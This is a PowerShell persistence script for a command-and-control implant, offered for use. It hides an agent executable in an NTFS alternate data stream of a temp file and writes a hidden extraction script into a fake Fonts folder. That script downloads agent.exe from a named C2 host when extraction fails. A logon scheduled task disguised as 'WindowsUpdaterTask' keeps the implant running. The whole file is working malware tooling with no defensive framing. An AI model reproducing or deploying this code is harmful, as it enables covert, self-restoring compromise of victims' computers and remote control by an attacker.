param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

# ============================================================
# 1. Permanent folder in LocalAppData\Microsoft\Windows\Fonts
# ============================================================
$permDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $permDir)) {
    New-Item -ItemType Directory -Path $permDir -Force | Out-Null
    attrib +h $permDir   # hide the folder
}
$scriptPath = "$permDir\run.ps1"
$carrierFile = "C:\Windows\Temp\~DF539A.tmp"
$streamName = "thumbs.db"
$c2BaseUrl = "https://c2-serverv2-qxvl.onrender.com"  # replace with your actual C2

# ============================================================
# 2. Hide the agent in an ADS (backup)
# ============================================================
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $carrierFile -Stream $streamName -Value $agentBytes -Encoding Byte
$hiddenPath = "$carrierFile`:$streamName"

# ============================================================
# 3. Create the extraction script (run.ps1) in the permanent folder
# ============================================================
$extractCode = @"
`$carrierFile = '$carrierFile'
`$streamName = '$streamName'
`$agentUrl = '$c2BaseUrl/agent.exe'
`$tempAgent = "`$env:TEMP\agent.exe"

# Try to extract from carrier
if (Test-Path `$carrierFile) {
    `$bytes = Get-Content -Path `$carrierFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
    if (`$bytes) {
        [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
        Start-Process -WindowStyle Hidden `$tempAgent
        exit
    }
}

# Fallback: download fresh agent
try {
    Invoke-WebRequest -Uri `$agentUrl -OutFile `$tempAgent -ErrorAction Stop
} catch {
    exit
}

# Recreate carrier file with hidden agent for next boot
if (Test-Path `$tempAgent) {
    `$newBytes = [System.IO.File]::ReadAllBytes(`$tempAgent)
    if (-not (Test-Path `$carrierFile)) {
        Set-Content -Path `$carrierFile -Value "[Temp File]" -Encoding ASCII
    }
    Set-Content -Path `$carrierFile -Stream `$streamName -Value `$newBytes -Encoding Byte
    Start-Process -WindowStyle Hidden `$tempAgent
}
"@

Set-Content -Path $scriptPath -Value $extractCode -Encoding ASCII -Force
attrib +h $scriptPath   # hide the script too

# ============================================================
# 4. Create/update scheduled task to run the permanent script
# ============================================================
$taskName = "WindowsUpdaterTask"
$taskCommand = "powershell.exe -WindowStyle Hidden -File `"$scriptPath`""

# Use COM to create task (no admin, no password prompt)
try {
    $taskService = New-Object -ComObject Schedule.Service
    $taskService.Connect()
    $rootFolder = $taskService.GetFolder("\")
    try { $rootFolder.DeleteTask($taskName, 0) } catch { }

    $taskDefinition = $taskService.NewTask(0)
    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
    $taskDefinition.Principal.UserId = $env:USERNAME
    $taskDefinition.Principal.LogonType = 3
    $trigger = $taskDefinition.Triggers.Create(9)
    $trigger.UserId = $env:USERNAME
    $action = $taskDefinition.Actions.Create(0)
    $action.Path = "powershell.exe"
    $action.Arguments = "-WindowStyle Hidden -File `"$scriptPath`""
    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
    Write-Output "[+] Scheduled task '$taskName' created/updated."
} catch {
    Write-Output "[-] Failed to create scheduled task: $_"
}

Write-Output ""
Write-Output "✅ PERSISTENCE COMPLETE"
Write-Output "Script location: $scriptPath"
Write-Output "Agent hidden in: $hiddenPath"
Write-Output "The scheduled task will run the script from the permanent folder on next logon."